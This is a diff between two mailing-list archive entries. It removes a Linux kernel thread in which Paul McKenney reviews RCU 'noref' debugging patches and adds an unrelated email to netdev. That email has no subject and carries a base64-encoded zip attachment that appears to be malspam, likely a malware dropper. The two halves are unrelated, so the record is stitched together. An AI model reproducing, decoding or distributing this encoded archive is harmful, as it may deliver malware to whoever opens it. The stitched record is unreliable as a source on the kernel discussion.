@@ -1,195 +1,125 @@
-From: "Paul E. McKenney" <paulmck@linux.vnet.ibm.com>
-Subject: Re: [PATCH 0/4] RCU: introduce noref debug
-Date: Tue, 10 Oct 2017 21:02:25 -0700
-Message-ID: <20171011040225.GU3521@linux.vnet.ibm.com>
-References: <cover.1507294365.git.pabeni@redhat.com>
- <20171006133436.GY3521@linux.vnet.ibm.com>
- <1507302609.2793.16.camel@redhat.com>
- <20171006163414.GC3521@linux.vnet.ibm.com>
- <1507567992.21825.9.camel@redhat.com>
-Reply-To: paulmck@linux.vnet.ibm.com
+From: <morice.diane@gmail.com>
+Subject: (unknown)
+Date: Wed, 11 Oct 2017 04:11:46 -0000
+Message-ID: <150769510615.879.14481299709702421398@138-97-64-229.westlink.net.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: linux-kernel@vger.kernel.org,
-        Josh Triplett <josh@joshtriplett.org>,
-        Steven Rostedt <rostedt@goodmis.org>,
-        "David S. Miller" <davem@davemloft.net>,
-        Eric Dumazet <edumazet@google.com>,
-        Hannes Frederic Sowa <hannes@stressinduktion.org>,
-        netdev@vger.kernel.org
-To: Paolo Abeni <pabeni@redhat.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <1507567992.21825.9.camel@redhat.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="998537216140305.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 138-97-64-229.westlink.net.br ([170.247.42.229]:46637 "HELO
+        138-97-64-229.westlink.net.br" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1750722AbdJKELt (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Wed, 11 Oct 2017 00:11:49 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Mon, Oct 09, 2017 at 06:53:12PM +0200, Paolo Abeni wrote:
-> On Fri, 2017-10-06 at 09:34 -0700, Paul E. McKenney wrote:
-> > On Fri, Oct 06, 2017 at 05:10:09PM +0200, Paolo Abeni wrote:
-> > > Hi,
-> > > 
-> > > On Fri, 2017-10-06 at 06:34 -0700, Paul E. McKenney wrote:
-> > > > On Fri, Oct 06, 2017 at 02:57:45PM +0200, Paolo Abeni wrote:
-> > > > > The networking subsystem is currently using some kind of long-lived
-> > > > > RCU-protected, references to avoid the overhead of full book-keeping.
-> > > > > 
-> > > > > Such references - skb_dst() noref - are stored inside the skbs and can be
-> > > > > moved across relevant slices of the network stack, with the users
-> > > > > being in charge of properly clearing the relevant skb - or properly refcount
-> > > > > the related dst references - before the skb escapes the RCU section.
-> > > > > 
-> > > > > We currently don't have any deterministic debug infrastructure to check
-> > > > > the dst noref usages - and the introduction of others noref artifact is
-> > > > > currently under discussion.
-> > > > > 
-> > > > > This series tries to tackle the above introducing an RCU debug infrastructure
-> > > > > aimed at spotting incorrect noref pointer usage, in patch one. The
-> > > > > infrastructure is small and must be explicitly enabled via a newly introduced
-> > > > > build option.
-> > > > > 
-> > > > > Patch two uses such infrastructure to track dst noref usage in the networking
-> > > > > stack.
-> > > > > 
-> > > > > Patch 3 and 4 are bugfixes for small buglet found running this infrastructure
-> > > > > on basic scenarios.
-> > > 
-> > > Thank you for the prompt reply!
-> > > > 
-> > > > This patchset does not look like it handles rcu_read_lock() nesting.
-> > > > For example, given code like this:
-> > > > 
-> > > > 	void foo(void)
-> > > > 	{
-> > > > 		rcu_read_lock();
-> > > > 		rcu_track_noref(&key2, &noref2, true);
-> > > > 		do_something();
-> > > > 		rcu_track_noref(&key2, &noref2, false);
-> > > > 		rcu_read_unlock();
-> > > > 	}
-> > > > 
-> > > > 	void bar(void)
-> > > > 	{
-> > > > 		rcu_read_lock();
-> > > > 		rcu_track_noref(&key1, &noref1, true);
-> > > > 		do_something_more();
-> > > > 		foo();
-> > > > 		do_something_else();
-> > > > 		rcu_track_noref(&key1, &noref1, false);
-> > > > 		rcu_read_unlock();
-> > > > 	}
-> > > > 
-> > > > 	void grill(void)
-> > > > 	{
-> > > > 		foo();
-> > > > 	}
-> > > > 
-> > > > It looks like foo()'s rcu_read_unlock() will complain about key1.
-> > > > You could remove foo()'s rcu_read_lock() and rcu_read_unlock(), but
-> > > > that will break the call from grill().
-> > > 
-> > > Actually the code should cope correctly with your example; when foo()'s
-> > > rcu_read_unlock() is called, 'cache' contains:
-> > > 
-> > > { { &key1, &noref1, 1},  // ...
-> > > 
-> > > and when the related __rcu_check_noref() is invoked preempt_count() is
-> > > 2 - because the check is called before decreasing the preempt counter.
-> > > 
-> > > In the main loop inside __rcu_check_noref() we will hit always the
-> > > 'continue' statement because 'cache->store[i].nesting != nesting', so
-> > > no warn will be triggered.
-> > 
-> > You are right, it was too early, and my example wasn't correct.  How
-> > about this one?
-> > 
-> > 	void foo(void (*f)(struct s *sp), struct s **spp)
-> > 	{
-> > 		rcu_read_lock();
-> > 		rcu_track_noref(&key2, &noref2, true);
-> > 		f(spp);
-> > 		rcu_track_noref(&key2, &noref2, false);
-> > 		rcu_read_unlock();
-> > 	}
-> > 
-> > 	void barcb(struct s **spp)
-> > 	{
-> > 		*spp = &noref3;
-> > 		rcu_track_noref(&key3, *spp, true);
-> > 	}
-> > 
-> > 	void bar(void)
-> > 	{
-> > 		struct s *sp;
-> > 
-> > 		rcu_read_lock();
-> > 		rcu_track_noref(&key1, &noref1, true);
-> > 		do_something_more();
-> > 		foo(barcb, &sp);
-> > 		do_something_else(sp);
-> > 		rcu_track_noref(&key3, sp, false);
-> > 		rcu_track_noref(&key1, &noref1, false);
-> > 		rcu_read_unlock();
-> > 	}
-> > 
-> > 	void grillcb(struct s **spp)
-> > 	{
-> > 		*spp
-> > 	}
-> > 
-> > 	void grill(void)
-> > 	{
-> > 		foo();
-> > 	}
-> 
-> You are right: this will generate a splat, even if the code it safe.
-> The false positive can be avoided looking for leaked references only in
-> the outermost rcu unlook. I did a previous implementation performing
-> such check, but it emitted very generic splat so I tried to be more
-> strict. The latter choice allowed to find/do 3/4.
-> 
-> What about using save_stack_trace() in rcu_track_noref(, true) and
-> reporting such stack trace when the check in the outer most rcu fails?
-> 
-> the current strict/false-postive-prone check could be enabled under an
-> additional build flag.
-
-Linus and Ingo will ask me how users decide how they should set that
-additional build flag.  Especially given that if there is code that
-requires non-strict checking, isn't everyone required to set up non-strict
-checking to avoid false positives?  Unless you can also configure out
-all the code that requires non-strict checking, I suppose, but how
-would you keep track of what to configure out?
-
-> > How does the user select the key argument?  It looks like someone
-> > can choose to just pass in NULL -- is that the intent, or am I confused
-> > about this as well?
-> 
-> The 'key' argument is intented to discriminate the scope of the same
-> noref dst attached to different skbs, which happens e.g. as a result of
-> as skb_dst_copy().
-> 
-> In a generic use case, it can be NULL, too.
-
-OK.  There will probably be some discussion about the API in that case.
-
-> > I am also concerned about false negatives when the user invokes
-> > rcu_track_noref(..., false) but then leaks the pointer anyway.  Or is
-> > there something you are doing that catches this that I am missing?
-> 
-> If the rcu_track_noref(..., false) is misplaced or missing, yes we can
-> have false negative. 
-> 
-> In the noref rcu use-case the rcu_track_noref(, false) call is/must be
-> placed side-by-side with the code clearing the the noref pointer, so
-> is/should be quite easy avoiding such mistakes.
-
-True enough.  Except that if people were good about always clearing the
-pointer, then the pointer couldn't leak, right?  Or am I missing something
-in your use cases?
-
-Or to put it another way -- have you been able to catch any real
-pointer-leak bugs with this?  The other RCU debug options have had
-pretty long found-bug lists before we accepted them.
-
-							Thanx, Paul
+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
+AAEAWwAAADYXAAAAAA==
